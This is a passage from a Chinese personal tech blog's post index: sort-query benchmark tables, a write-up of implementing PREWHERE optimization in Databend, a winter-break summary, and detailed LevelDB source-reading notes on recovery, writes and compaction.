0.27476401 4.034133859 select userid, flashmajor from hits order by flashmajor, userid desc limit 100; 4 0.06037709 0.17488738 2.896585112 select resolutiondepth from hits order by resolutiondepth limit 100; 5 0.12315882 0.1646738 1.337084912 select title from hits order by title limit 100; 6 0.12697252 0.17209053 1.355336808 select title from hits order by title desc limit 100; 7 0.12341952 0.24537162 1.988110309 select userid, title from hits order by userid, title limit 100; 8 0.12241615 0.28931403 2.363364883 select userid, title from hits order by userid desc, title limit 100; 9 0.12456732 0.2316427 1.859578419 select userid, title from hits order by userid, title desc limit 100; 10 0.12659582 0.25043391 1.978216263 select userid, title from hits order by userid desc, title desc limit 100; aggregation with sort ID new old old / new SQL 1 0.05681156 0.16286981 2.866842769 select avg(fetchtiming) from (select * from hits order by fetchtiming desc limit 100); 2 0.05609226 0.17959318 3.201746195 select avg(fetchtiming) from (select * from hits order by fetchtiming desc limit 1000); 3 0.05605486 0.17966659 3.205192021 select avg(fetchtiming) from (select * from hits order by fetchtiming desc limit 10000); 4 0.05836755 0.17961846 3.077368504 select avg(fetchtiming) from (select * from hits order by fetchtiming desc limit 50000); 5 0.06108108 0.18346159 3.003574757 select avg(fetchtiming) from (select * from hits order by fetchtiming desc limit 90000); 6 0.06054325 0.16922857 2.795168247 select avg(sendtiming) from (select * from hits order by sendtiming desc limit 50000); 7 0.06047222 0.18473938 3.054946222 select avg(dnstiming) from (select * from hits order by dnstiming desc limit 50000); 8 0.06025029 0.19324225 3.207324811 select avg(connecttiming) from (select * from hits order by connecttiming desc limit 50000); 9 0.06222921 0.17401594 2.796370708 select avg(responsestarttiming) from (select * from hits order by responsestarttiming desc limit 50000); 10 0.06191917 0.16554495 2.673565392 select avg(responseendtiming) from (select * from hits order by responseendtiming desc limit 50000); 其他优化点 并行二路归并排序 DuckDB 使用这种方法来优化二路归并排序。并行二路归并排序的实现来源于论文 Merge Path - A Visually Intuitive Approach to Parallel Merging，其基本思想是将找到两个有序序列中的排序交叉点，将两个序列按照交叉点分组，使得每个组内的两个数据部分独自归并排序，最后将所有块的结果合并。序列的分组使得每个组的归并排序可以并行执行，不会互相影响，最后直接这便可得到全序结果。 DuckDB 排序优化博客：https://duckdb.org/2021/08/27/external-sorting.html。 基数排序 DuckDB 与 ClickHouse 等数据库都引入了基数排序。基数排序是一种非比较的基于分布的排序方式，时间复杂度为 O(nk)，其中 k 是排序键的宽度（比如 Int32 的宽度是 4 字节），n 是排序键个数。当 n 很大的时候，基数排序的性能优势就会显现出来。 特化 Cursor 如果排序键只有一个，且是 non-nullable 的简单类型，便可以将 Rows 直接 downcast 为简单类型的一维数组，对于简单类型有着非常好的优化效果。类似的，如果存在多个排序键，但是他们可以合并成一个简单的排序键（比如两个 i32 可以合并为 i64）。这是一类大的优化方向。 局限性如果排序键为聚合函数的结果，以目前的实现来说，用于排序的始终就只有一条流水线，无法进行流化多路归并。需要针对这种情况优化流水线。 1SELECT COUNT(*) as c FROM table ORDER BY c;","tags":["数据库"],"categories":["数据库","源码笔记"]},{"title":"列式存储之PREWHERE优化","path":"/column-storage-prewhere/","content":"最近学习到了列式存储引擎中的 PREWHERE 优化，写下此文来记录一下与此有关的所见所想。 列式存储数据库的查询流程以这么一条 SQL 语句为例 1SELECT b, c, e FROM t WHERE a &gt; 1 AND c = 3; 对于一个简单的列式存储数据库，它的查询流程可能是这样的： 首先会构建一个如图这样的 Projection-Filter-Scan 执行计划，其中 Scan 算子会从底层存储引擎中读取数据。在一般的列式存储引擎中，列数据会被存储在多个 Partition 中，存储引擎可以以 Parition 会单位读取列数据，并依次向上层算子返回数据。 再上图的所示的例子中，所有需要进行计算的列 (a, b, c, e) 都会被读取到内存中，并且经由 Filter 算子计算进行行筛选，最后再由 Projection 算法进行最终的列筛选。 这样的执行过程，其实有一部分开销可以省去的。比如对于列 b 和 列 e，它们并不会参与 Filter 的计算，我们是否可以提前进行筛选，避免不必要的 b 和 e 的读取以及拷贝呢？这便是 PREWHERE 优化的思想。 PREWHERE 优化PREWHERE 优化的思想其实很简单，就是将 WHERE 中的条件下推到 Scan 算子中，并尽可能移除 Filter 算子。具体来说，Scan 算子在进行最小读取单位 (可以是 Block，也可以是 Partition 等等，看引擎具体的实现) 的读取时，先预读取 PREWHERE 条件中的列进行预筛选。如果这些行中包含的所有数据都不满足筛选条件，那么这个 Block 或 Partition 就可以直接跳过，不用再读剩下的列了。在这种情况下，会大大节省读取带宽，提升读取速度。 当然，PREWHERE 不是万金油，当条件语句中的列覆盖了所有需要读取的列是，经过了 PREWHERE 优化的查询就和原始的所有数据一起过 Filter 的查询相差无几了，甚至可能会更慢 (更多分支、内存拷贝等因素)。因此，在实际的实现中，往往会有一些启发式的规则，结合上相关列的数量、在内存中的大小等因素，选择性地将 WHERE 中的条件转移到 PREWHERE 并下推到 Scan。 ClickHouse 中的 PREWHEREClickHouse[1] (以下简称 CK)很早就实现了 PREWHERE[2]，并将其作为了一个可以手动使用的语句，例如： 1SELECT * FROM t PREWHERE a &gt; 1; 不过，CK 并不倡导用户手动使用 PREWHERE 语句，而是让 CK 的 SQL 引擎自行优化。CK 会在构建查询执行器 (InterpreterQuery) 时对 AST 进行一次分析，按照一定规则 (可自行查阅源码。规则虽然不少，但源码较为简单，可以比较容易地看懂) 来选择哪些以及多少条件语句会从 WHERE 中移至 PREWHERE 中，并改写 AST，最后再生成最终的执行器。 Databend 中的 PREWHERE 实现近日，我在 Databend 中进行了 PREWHERE 的初步实现[3]，也是对 Databend 的源码有了更多的了解。 我的实现主要是分为两部分，第一部分是如何将 PREWHERE 的相关信息下推到 Scan 算子，更具体的，是如何下推到支持 PREWHERE 优化的 Fuse Engine 中。第二部分就是 Fuse Engine 如何进行前文所述的 PREWHERE 数据读取。 PREWHERE 下推与 CK 不同，Databend 的 SQL 层更加模块化。在我这次的实现中，我决定基于 Rule-Based Optimizer(RBO) 来进行 PREWHERE 信息下推。 对于 Filter-LogicalGet 这样一个 Pattern，我们可以将 Filter 中的条件语句全部打包成一个 PrewhereInfo 塞给 LogicalGet，然后在一路推给下层引擎。 可以看出，目前这一部分还是很 naive 的，首先是条件语句几乎是全部传给下一层，除了涉及到所有要读取的列的语句；其次，目前并没有根据统计信息做一些启发式的规则，这个还需要后续的优化。 另外，让优化器模块来负责 PREWHERE 信息的生成可能不太好，以后修改起来可能会比较麻烦，比如现在还没支持的一个点: Projection 剪枝，就需要牵扯到 prune_columns 这个 Rule。还需要找到一个更好的方法来实现，可以参考其他列式存储数据库的实现方法 (如 DuckDB, Doris 等)。 数据读取Fuse Engine 数据读取相关的源码设计的很巧妙。它将数据读取的流程设计为了一个状态机，这样可以把整个读取流程划分为多个状态。这样做的好处是，可以将同步与异步逻辑分开，提升运行的效率。另外一个好处就是，代码写起来逻辑会更加清晰，代码的维护与修改也更加简单。 如图所示，我将以前的 ReadData 拆分为了 ReadPrewhere 与 ReadRemain 两个状态，分别用来读取 PREWHERE 所需要的列与补全剩余列。初次之外，还增加了一个 Filter 状态用来对 ReadDataPrewhere 之后的数据进行过滤，并生成一个 Boolean 类型的列来表示每一行的过滤结果，用 FilterColumn 来表示。值得注意的是，如果没有 Filter，即没有 PREWHERE 信息，则可退化为最初的状态机；另外如果所有列都在 PREWHERE 中，那么在 Filter 之后便可以直接转到 Deserialize 进行 DataBlock 的生成（其实并不会出现这种情况，因为如上文所说，如果所有列都在条件语句中，则不会进行 PREWHERE 优化）。 另外一个小细节是，FilterColumn 与 ReadDataPrewhere 后的 raw data 需要从 Filter 一直传递到 Deserialize，以便合并与过滤 (这里是否会有不少内存拷贝的开销？C++可以只传指针，rustc 和 LLVM 的优化应该也会保证性能吧。但比起 IO 上的开销，内存拷贝的开销应该可以说是微乎其微了)。 当然，在具体的代码实现中还有很多小细节，这里就不做赘述了。 性能对比测试机器相关信息： OS: Ubuntu 18.04 LTS (Bionic Beaver) Disk: 885G / 1.9T (50%) CPU: Intel Xeon Gold 5218R @ 80x 2.924GHz [46.0°C] RAM: 8993MiB / 95152MiB 这里进行了一个简单的性能对比。使用的数据集是 https://github.com/datafuselabs/databend/blob/main/tests/logictest/suites/ydb/select1-1.test 这里面的插入数据。我将这些数据每五个作为一次插入，并重复插入直至 21828 条数据。这里是为了保证有一定的数据量，并且数据能够打散在不同的 Partition 中。这里使用的 SQL 语句为: 1select * from t1 where a &lt; 174 and b &lt; 130; 其中 174 和 130 分别是 a 列和 b 列相对平均的值。我使用了 hyperfine 工具来做简单的 benchmark 测试，预热运行 3 次，正式运行 10 次。测试结果如下： PREWHER 优化之前: Mean [ms] Min [ms] Max [ms] 856.5 ± 18.5 837.5 892.0 PREWHERE 优化之后: Mean [ms] Min [ms] Max [ms] 847.0 ± 12.5 829.0 872.3 可以看到，PREWHERE 优化之后此查询语句的运行速度大概提升了 10ms (1.11%)，并不是特别明显。并且其他语句诸如 select * from t1 where a &lt; 174 and b &gt; 130; 并未见到明显提升，甚至 PREWHERE 之后的结果更逊一筹。这里差别不明显的原因主要有以下几点： Databend 在 PREWHERE 优化之前，便会将 Filter 整体下推到 Fuse Engine，用于 Parition 的剪枝，也就是会根据 min-max 等索引信息预先过滤掉一些 Partition。所以对于一些数据或查询语句，PREWHERE 优化之前的性能已经很好了。 对于一些查询语句，Parition 无法预先被过滤掉。如果一个 Partition 内数据量较大，且不满足 PREWHERE 条件，那么 PREWHERE 优化的提升效果会很明显。后续优化数据读取逻辑之后（并非每次读一个 Partition，而是更加细化），可能会见到比较明显的差别。 本次性能测试还是比较 naive 的。首先是直接使用的 Debug 产物进行测试，其次是数据集太小，且数据分布不太符合真实场景，之后可以考虑使用 TPC-H 进行测试。 接下来可以继续做的 如上文所说，PREWHERE 优化还可以对下推到 Fuse Engine 的 Projection (不是 SQL 的 Projection，是 Fuse Engine 需要返回给上层的数据列) 进行剪枝。 PREWHERE 列的选取还可以结合统计数据进行启发式优化。 目前 Fuse Engine 读取数据的最小单元是 Partition，如果 Partition 数量少并且一个 Partition 中的数据量很大的话 (一次性 Insert 大量数据、后期 Partition 的 Compaction 会导致这种结果)，PREWHERE 的优化意义便会变得很小 (甚至负优化？)。数据块的读取这方面也亟待优化。 REFERENCE [1] https://github.com/ClickHouse/ClickHouse [2] https://clickhouse.com/docs/en/sql-reference/statements/select/prewhere [3] https://github.com/datafuselabs/databend/pull/7340 致谢 感谢 @sundy-li 大佬不厌其烦地答疑解惑与指导。 感谢 @leiysky 大佬在群里对我多次关于 SQL 层相关源码问题的解答。 感谢 @b41sh 与 @xudong.w 两位大佬的 Code Review。 感谢 @ClSlaid 大佬的 Approval。 感谢 ClickHouse 的源码。 感谢实验室强大的服务器。 感谢 VSCode 与 Rust Analyzer。 CHANGELOG 2022-09-16 Prewhere 优化修改为将 filter predicates 全部下推。https://github.com/datafuselabs/databend/pull/7646 2022-09-11 修复 read rows 统计信息错误。https://github.com/datafuselabs/databend/pull/7566 2022-09-09 优化列数据读取流程，减少反序列化次数。https://github.com/datafuselabs/databend/pull/7551 2022-08-31 初版实现。https://github.com/datafuselabs/databend/pull/7340","tags":["数据库"],"categories":["数据库","源码笔记"]},{"title":"寒假总结","path":"/2022-winter-summary/","content":"这个寒假我做了些什么？ 学习 听完了 6.S081 2020 的课并做完了配套的 Lab，收获颇多。 复习了之前 PingCAP Talent Plan 中用 Rust 实现一个 log-structured KV 存储引擎的实现思路，重点看了一下 lock free 读的实现。 比较完整地阅读学习了 LevelDB 的源码，学到了很多 C++ 开发的技巧与 LSM-Tree 相关的知识，读完源码之后速览了 《精通 LevelDB》 这本书，和作者进行了一些交流。 看了一些技术博客，不一一列举了。 作为研究生的科研？那是什么？ Coding 继续日常的 LeetCode 每日一题，以及周常的周赛，并 AK 了一次周赛。但是2月1日的时候被禁赛了一个月。 依照网上的教程迅速实现了一波简单的 RPC 框架和分布式缓存。前者主要是了解了一下基于 TCP 的网络协议的实现，后者就是老生常谈的 LRU 与一致性哈希。 为开源项目 bemaniutils 修复了 SDVX Skill Analyzer 存结果时候的 bug。私下维护着一份私有 fork，以支持最新最热。 稍微魔改了下 vscode-leetcode 插件，录了个 demo 视频。 依照 LevelDB 的代码实现了一波 SkipList，代码放在了我的 trivial 这个 repo 下。并集成了一波 googletest 做单测，并接入了 GitHub Actions 做 CI。 游戏 通关了《双人成行》与《Sifu》，《Kena》打了一半不想玩了。 回坑了《堡垒之夜》。 玩了几把《风暴英雄》。 舞萌DX 底分打到了 5929，本来想着回北京之前 6000 的，但由于成都疫情，不敢出门。 入了 IPEGA 的歌姬计划手台。 入了 CHUNITHM 手台。 其他 参加了 TiDB Hackthon 2021，在两位哥哥的带领下，靠项目 TiDB MVCC 时光机 荣获三等奖。 更新了一波简历。 参加了 Singularity Data 存储工程师（实习）的面试，但是没过。 帮老爸跑了很多次腿。 终于参加了一次高中聚餐。 多次唱 K，并多次唱了 Love Live 的歌。 未来计划 或许应该开始考虑科研了…… 阅读《MySQL 技术内幕：InnoDB存储引擎（第二版）》与《数据库查询优化器的艺术：原理解析与SQL性能优化》。 舞萌DX 达到6000分，CHUNITHM Rating 达到 14，SDVX 暴龙天分析成功。 在 PS4 上玩战神5。 这个寒假过的其实并不是很充实，而且也挺慌的，因为是在不知道能做些什么，每天干的最多的事情就是反复刷 b 站。真害怕毕不了业啊……","tags":["寒假总结"],"categories":["生活"]},{"title":"关于 LevelDB 的一些问题（个人向）","path":"/leveldb-notes/","content":"记录一下学习 LevelDB 遇到的一些问题。 最后更新：2022-05-08。 为什么每次重新打开 LevelDB 都会生成新的文件如果一开始就不存在 DB 相关文件，自然会创建新的，这里主要看一下已经存在旧的文件时的情况。 MANIFEST 文件先来看 MANIFEST 这个文件为什么每次都会生成一个新的。在方法 DB::Open 中，会调用方法 DBImpl::Recover(VersionEdit* edit, bool* save_manifest) 将 DB 信息恢复到内存中，其中的参数 save_manifest 就代表这是否需要将内存中的元信息写入到新的 MANIFEST 文件中。 首先会进入到方法 VersionSet::Recover(bool* save_manifest) (db/version_set.cc) 中。这个方法会读取老的 MANIFEST 文件，恢复整个 DB 的元信息（比如 comparator name、log number、last seq number、new file entry 等）。在方法的最后，会调用 VersionSet::ReuseManifest 来判读是否需要重新生成新的 MANIFEST 文件： 如果 Options 中没有设置 reuse_logs 这个选项，则默认会生成新的 MANIFEST 文件 (return false)。 否则会进行一系列的信息检测，如果都通过，则会不会生成新的 MANIFEST 文件 (return true)。这些检测包括： 当前的 DB 文件是否都合法。 当前的 MANIFEST 是否是 appendable 的。 回到 DB::Oepn 后若 save_manifest 为 true，则通过 VersionSet::LogAndApply 写入新的 MANIFEST 文件。然后再调用 DBImpl::RemoveObsoleteFiles 来删掉旧的 MANIFEST 文件。 涉及 MANIFEST 文件的伪代码大致如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// db/db_impl.ccStatus DB::Open(const Options&amp; options, const std::string&amp; dbname, DB** dbptr) &#123; // ... Status s = impl-&gt;Recover(&amp;edit, &amp;save_manifest); // ... if (s.ok() &amp;&amp; save_manifest) &#123; // ... s = impl-&gt;versions_-&gt;LogAndApply(&amp;edit, &amp;mutex_); &#125; if (s.ok()) &#123; // ... impl-&gt;RemoveObsoleteFiles(); // ... &#125; // ...&#125;Status DBImpl::Recover(VersionEdit* edit, bool* save_manifest) &#123; // ... s = versions_-&gt;Recover(save_manifest); // ...&#125;// db/version_set.ccStatus VersionSet::Recover(bool* save_manifest) &#123; Status s = RecoverFromManifest(); // ... if (s.ok()) &#123; if (ReuseManifest(dscname, current)) &#123; // No need to save new manifest &#125; else &#123; *save_manifest = true; &#125; &#125; // ...&#125;bool VersionSet::ReuseManifest(const std::string&amp; dscname, const std::string&amp; dscbase) &#123; if (!options_-&gt;reuse_logs) &#123; return false; &#125; // ... if (!ParseFileName(dscbase, &amp;manifest_number, &amp;manifest_type) || manifest_type != kDescriptorFile || !env_-&gt;GetFileSize(dscname, &amp;manifest_size).ok() || // Make new compacted MANIFEST if old one is too big manifest_size &gt;= TargetFileSize(options_)) &#123; return false; &#125; Status r = env_-&gt;NewAppendableFile(dscname, &amp;descriptor_file_); if (!r.ok()) &#123; return false; &#125; // ... return true;&#125; .log 文件每次重启 DB 都会生成新的 .log 文件，但是创建时机有所不同。 最简单的是，旧的 .log 文件中没有记录，所以在之前的 DBImpl::Recover 过程中不会建立 MemTable，也就是 impl_-&gt;mem_ 为 nullptr，程序会以这个依据在 DB::Open 的逻辑中为 DB 创建新的 .log 文件并在内存中创建新的 Memtable。 如果旧的 .log 文件有记录，则会在 DBImpl::Recover 中调用的 DBImpl::RecoverLogFile 中读取记录，并在这个时候建立 MemTable，并将 log 应用到 MemTable 中，并立刻持久化到 .ldb 文件中（minor compaction）。这里并不会将创建的 MemTable 保存在内存中（也就是不会赋值给 impl_，因为需要将已经落盘的 MemTable 从内存中丢弃），等逻辑回到 DB::Open 中后，会和上面所说的 .log 中没有记录一样，进入 impl-&gt;mem_ == nullptr 的逻辑，统一创建新的 .log 文件与 MemTable。 顺带一提的是，其实可以设置 Options 中的 reuse_logs 选项来选择复用旧的 .log 文件，但是前提是 .log 是 appendable 的，并且没有经历过 compaction（如果 MemTable 中的数据量过大，会在判断 reuse_logs 选项之前进行 minor compaction，将 MemTable 落盘，需要将已经落盘的 MemTable 从内存中丢弃，这之后就会进入上面所说的创建新 log 的逻辑，所以就没法复用旧 log 了）。如果没有经历过 compaction，则可以直接保留 MemTable 到 impl_-&gt;mem 中，跳过之后创建新 log 和新 MemTable 的逻辑。 最后与 MANIFEST 文件同理，会通过 DBImpl::RemoveObsoleteFiles 清理掉旧的 .log 文件。这里需要注意的是，一旦 Recover 了 log 并 dump 到了 SST 之后，旧的 log 就作废不能再使用了，必须将其删除，如果在上述 reuse_logs 的逻辑中继续使用经历过 minor compaction 的 log，则会导致再次重启时重复写入已经 dump 过了的大量数据，影响性能。 涉及 .log 文件的恢复流程大致伪代码如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980// db/db_impl.ccStatus DB::Open(const Options&amp; options, const std::string&amp; dbname, DB** dbptr) &#123; // ... Status s = impl-&gt;Recover(&amp;edit, &amp;save_manifest); if (s.ok() &amp;&amp; impl-&gt;mem_ == nullptr) &#123; s = NewLogFile(); // pseudo code if (s.ok()) &#123; edit.SetLogNumber(new_log_number); impl-&gt;logfile_ = lfile; impl-&gt;logfile_number_ = new_log_number; impl_mem_ = NewMemTable(); // pseudo code &#125; &#125; // ... if (s.ok()) &#123; impl-&gt;RemoveObsoleteFiles(); // ... &#125; // ...&#125;Status DBImpl::Recover(VersionEdit* edit, bool* save_manifest) &#123; // ... std::vector&lt;uint64_t&gt; logs; GetLogs(&amp;logs); std::sort(logs.begin(), logs.end()); for (log in logs) &#123; s = RecoverLogFile( logs[i], (i == logs.size() - 1), save_manifest, edit, &amp;max_sequence); // ... &#125; // ...&#125;Status DBImpl::RecoverLogFile(uint64_t log_number, bool last_log, bool* save_manifest, VersionEdit* edit, SequenceNumber* max_sequence) &#123; // ... while (reader.ReadRecord(&amp;record, &amp;scratch) &amp;&amp; status.ok()) &#123; // ... if (mem == nullptr) &#123; mem = NewMemTable(); // pseudo code &#125; status = InsertInto(&amp;batch, mem); // ... if (mem-&gt;ApproximateMemoryUsage() &gt; options_.write_buffer_size) &#123; compactions++; *save_manifest = true; status = WriteLevel0Table(mem, edit, nullptr); // ... &#125; &#125; // ... if (status.ok() &amp;&amp; options_.reuse_logs &amp;&amp; last_log &amp;&amp; compactions == 0) &#123; if (NewAppendableFile(logfilename, &amp;logfile_)) &#123; // ... if (mem != nullptr) &#123; mem_ = mem; mem = nullptr; &#125; else &#123; mem_ = NewMemTable(); // pseudo code &#125; // ... &#125; &#125; if (mem != nullptr) &#123; // ... if (status.ok()) &#123; *save_manifest = true; status = WriteLevel0Table(mem, edit, nullptr); &#125; // ... &#125; // ...&#125; .ldb 文件如上文所说，在重新打开 DB 后，如果旧的 .log 文件中存在写入记录，则会根据 log 建立 MemTable，并调用 DBImpl::WriteLevel0Table 将刚建立 MemTable 写入（或称 dump）为一个新的 .ldb 文件，并将 MemTable 删除。值得注意的是，这里虽然方法名字叫 WriteLevel0Table，但是其实不一定是写到 Level-0，LevelDB 可能会按照一定策略提前将 SST 写到更深层的 Level 中，这部分留到之后再看了。如果 log 中没有相关记录则不会创建新的 .ldb 文件。这个 .ldb 文件也就是 SST，是对某一时刻的 MemTable 的 dump，也就是说一般情况下都是只读的。 在 DB::Open 的最后，还会调用 DBImpl::MaybeScheduleCompaction 在后台开启负责 compaction 的线程，对满足条件的 .ldb 文件进行 major compaction，这部分也留到之后再看。 DBImpl::Write 中为什么要调用 Sync()如果 WriteOptions 中设置了 sync 选项，在写入 log 之后会立刻调用 logfile_-&gt;Sync()： 12345678status = log_-&gt;AddRecord(WriteBatchInternal::Contents(write_batch));bool sync_error = false;if (status.ok() &amp;&amp; options.sync) &#123; status = logfile_-&gt;Sync(); if (!status.ok()) &#123; sync_error = true; &#125;&#125; 我的疑惑是 AddRecord 的实现中已经调用了 write 将内容写到了对应的文件描述符对应的文件，为什么还需要 Sync？这里其实是因为现代操作系统一般执行写入的时候都只是先把内容写到缓存中，极其一定大小的数据块后才统一 flush 到磁盘中，这样加快了写操作的速度。而调用 Sync 就相当于强制刷盘，进行一个同步的等待。拿实现了 POSIX 接口的环境来说（执行逻辑进入 util/env_posix.cc），最终会调用 fcntl(fd, F_FULLFSYNC) 或 fdatasync(fd) 或 fsyn(fd) ，这取决于当前系统的支持，其目的都是进行一个强制落盘的同步操作。所以说开启了 sync 这个选项可能使写操作变慢。如果 Sync 失败，则会记录一个 bg_error_（background error），使得之后所有的写操作都失败，源码中的注释写的是： The state of the log file is indeterminate: the log record we just added may or may not show up when the DB is re-opened. So we force the DB into a mode where all future writes fail. 我也不知道进入这个失败模式后会不会通过一些措施恢复，针对 bg_error_ 搜索了一番发现并没有恢复的逻辑，可能进入这个模式之后就只能靠应用层重启 DB 了吧。 DBImpl::Write 是怎么使用 writers 队列的一开始这个 writers 队列，还有 writer 的 condition variable 还有最后的 while 循环 pop writers 队列的一系列操作看的我很懵逼，心想这到底有什么意义，看起来和加一把大锁串行执行没什么区别。理解这一段代码着重需要理解这两个东西： C++ 中 condition variable 的用法。 DBImpl::BuildBatchGroup(Writer** last_writer) 这个方法的作用。 对于 condition variable 的实现，正好在 6.S081 中才学习到过，所以印象还算深刻。这里用到了 C++11 引入的 condition_variable，以及它的两个方法 wait 和 notify_one，其中 wait 的作用是让当前线程进入睡眠，指导有另一个线程调用了 notify_one（或 notify_all）唤醒它。这里有一个要点是 wait 还接收一个 lock，因为它会在进入睡眠之前 release 这个 lock，并在被唤醒后重新 acquire 这个 lock，如果一个 sleep 了的线程 hold 一个 lock，那不就一直死锁了嘛，至于为什么需要这样一个锁，那是因为 condition_variable 的操作往往通常出现在加锁的逻辑中（也就是需要对共享内存进行并发原子操作的场景），关于 condition_variable 更具体地细节可以查阅 https://en.cppreference.com/w/cpp/thread/condition_variable 。 对于 DBImpl::BuildBatchGroup(Writer** last_writer) 方法，不看的话还真会忽略掉一个最重要的东西，那就是在这个方法会将当前 writers 队列中的所有 writer 构建为一个 WriterBatch，并将 last_writer 更新为最后一个 writer（但是有个例外是，带了 sync 选项的不会和不带的一起）。 现在再来看着一段代码就很清晰了： 123456789101112131415161718192021222324252627282930313233343536373839Status DBImpl::Write(const WriteOptions&amp; options, WriteBatch* updates) &#123; // ... MutexLock l(&amp;mutex_); writers_.push_back(&amp;w); while (!w.done &amp;&amp; &amp;w != writers_.front()) &#123; w.cv.Wait(); &#125; if (w.done) &#123; return w.status; &#125; // ... if (status.ok() &amp;&amp; updates != nullptr) &#123; WriteBatch* write_batch = BuildBatchGroup(&amp;last_writer); //... &#123; mutex_.Unlock(); WriteLogAndMemTable(); // pseudo code mutex_.Lock(); &#125; // ... &#125; while (true) &#123; Writer* ready = writers_.front(); writers_.pop_front(); if (ready != &amp;w) &#123; ready-&gt;status = status; ready-&gt;done = true; ready-&gt;cv.Signal(); &#125; if (ready == last_writer) break; &#125; // Notify new head of write queue if (!writers_.empty()) &#123; writers_.front()-&gt;cv.Signal(); &#125; return status;&#125; 首先 MutexLock l(&amp;mutex_); 这段代码会先锁定 mutex_（类似 scoped_lock），最开始由于锁的存在只会进入一个 writer，并且不会进行 wait。当这个 writer 构建 WriteBatch 完毕之后便可释放 lock（因为每一个 WriteBatch 的落盘是互不影响的，它们之前没有需要共享的数据，MemTable 也有自己的锁）。在 lock 释放后并执行写入的这段时间，其他等待的 writer 便可以进入之后的被 push 进 writers 队列并进入睡眠状态。前一个 WriteBatch 的写入时间越长便越能积累更多的 writer。当前一个 WriteBatch 执行完毕后，就会查看 writer 队列，并唤醒一个 writer。下一个 writer 便可以同时将当前队列中的所有 writer 构建为一个 WriteBatch，并将 last_writer 更新为最后一个 writer。之后的 while 循环便是将已经被统一操作的 writer pop 出队列，并结束它们 block 住的线程。 DBImpl::Write 的设计让我在数据库写操作的设计与 C++ 多线程编程上学到很多（太棒了，学到昏厥）。代码逻辑清晰，可读性强，注释完备，连我那么菜的人都能轻松读懂，LevelDB 的代码质量可见一斑。 何时触发后台 Compaction直接查看 DBImpl::MaybeScheduleCompaction 这个方法的调用地点： DB::Open 完成之后会立刻进行一次。 在 Get 操作中，如果查找进入到了 SST 文件中，并将此文件的 allowed_seek 数量耗尽，并且没有其他正在 compact 的文件，便会将此文件设置为即将 compact 的文件并尝试启动后台 compaction 线程。 通过 DBIter 迭代时，会设定一个 bytes_until_read_sampling_，这个值是 0 ~ 1MB 中的一个正态分布随机值，如果迭代的数据量达到了这个上限，便会进行一次 sampling 操作，统计 SST 的读取统计信息，和上面的 Get 操作类似，如果某 SST 的 allowed_seek 耗尽，便会尝试启动后台 compaction 线程。 Put 与 Delete 操作最终会调用 DBImpl::Write。调用 DBImpl::Write 时会首先调用 DBImpl::MakeRoomForWrite 为写操作预留空间。在此方法中，如果发现 mutable 的 MemTable 已满，则会将它变为 immutable，然后创建新的 mutable MemTable，并尝试启动后台 compaction 线程。 现在再来看看 DBImpl::MaybeScheduleCompaction。对于一个 DB，只会产生一个 compaction 线程。具体来说，后台会启动一个 background_thread 线程，作为调度器，它的作用是循环抽取后台任务队列 background_work_queue_ 中的任务进行执行（如果队列为空会进入 wait 状态，有新的任务到来时再被唤醒），后续调用 DBImpl::MaybeScheduleCompaction 便会向任务队列推入一个 compaction 任务而不产生新的线程。这里我有一个疑惑是，源代码中是先进行唤醒，再向任务队列中放任务： 123456789101112131415// util/env_posix.ccvoid PosixEnv::Schedule( void (*background_work_function)(void* background_work_arg), void* background_work_arg) &#123; background_work_mutex_.Lock(); // ... // If the queue is empty, the background thread may be waiting for work. if (background_work_queue_.empty()) &#123; background_work_cv_.Signal(); &#125; background_work_queue_.emplace(background_work_function, background_work_arg); background_work_mutex_.Unlock();&#125; 是否先 emplace 再 Signal 更好，比如： 1234567891011void PosixEnv::Schedule( void (*background_work_function)(void* background_work_arg), void* background_work_arg) &#123; // ... bool empty = background_work_queue_.empty(); background_work_queue_.emplace(background_work_function, background_work_arg); if (empty) &#123; background_work_cv_.Signal(); &#125; // ...&#125; 但是其实这里并没有问题，先看看 background_thread 执行的代码： 1234567891011121314void PosixEnv::BackgroundThreadMain() &#123; while (true) &#123; background_work_mutex_.Lock(); // Wait until there is work to be done. while (background_work_queue_.empty()) &#123; background_work_cv_.Wait(); &#125; assert(!background_work_queue_.empty()); // ... background_work_mutex_.Unlock(); // ... &#125;&#125; 这里 background_work_cv_ 条件变量中的的 mutex 就是 background_work_mutex_，就像上一节「DBImpl::Write 是怎么使用 writers 队列的」中所说，从 wait 中苏醒后会立刻给 mutex 重新调用 lock，所以这里如果 background_thread 在 Schedule 的途中被唤醒，它并不会直接继续向下执行，而是会等待任务被推入队列然后释放锁之后才会进入后面的逻辑。 compaction 的调用链为 DBImpl::BGWork -&gt; DBImpl::BackgroundCall -&gt; DBImpl::BackgroundCompaction。 Compaction 的整个流程是怎样的Minor Compaction首先，在启动后台 compaction 线程后，如果发现存在 immutable MemTable，会立刻调用 DBImpl::WriteLevel0Table 将其 compact 到 Levels 中。这里有一点需要注意的是，新的 mutable MemTable 与 log 文件已经在将 mutable 变为 immutable 的时候进行了，所以在 DBImpl::WriteLevel0Table 成功之后可以直接设置新的 log number 并进行 VersionSet::LogAndApply 持久化最新的 DB meta 信息，并 DBImpl::RemoveObsoleteFiles 删除旧文件。 这里来仔细看一下 DBImpl::WriteLevel0Table，虽然名字是写 Level-0 的 SST，但是实际上不一定，它通过 Version::PickLevelForMemTableOutput 来确定新写的 SST 应该属于哪一层。这里借用博主 beihai 博客中的一张图来表示应该选用哪一层（最多到 Level-2）： 图中最下面的阈值是指，重叠的文件总大小大于 10 倍的 max_file_size（默认是 2MB）。 这里值得注意的一点是，代码逻辑中，是先写好 SST（落盘），再为它选择 Level。进行完 minor compaction 之后，本次 compaction 任务就结束了，不会再继续进行 major compaction。下一次 compaction 得等到下一次 DBImpl::MaybeScheduleCompaction 的触发。 Major Compaction如上一小节所说，LevelDB 中，Minor Compaction 和 Major Compaction 不会在一次 compaction 中一起完成。也就是说进行 Major Compaction 的时候 immutable Memtable 还是空的。 LevelDB 还提供了手动 compaction（ManualCompaction）的功能，这里主要看自动的部分。首先来看 VersionSet::PickCompaction 方法，这个方法会生成 Compaction 对象，供正式 compaction 使用。这里会有两种策略，一种是 size_compaction，一种是 seek_compaction，前者优先，并且一次只能选择一种 compaction，如果两种策略都不能执行，则不进行 compaction。size_compaction 的依据是 compaction_score 是否大于 1，这个值会通过 VersionSet::Finalize 这个方法进行评估，这个方法会得出需要 compaction 的 level 与 compaction_score，具体留到后面再看；seek_compaction 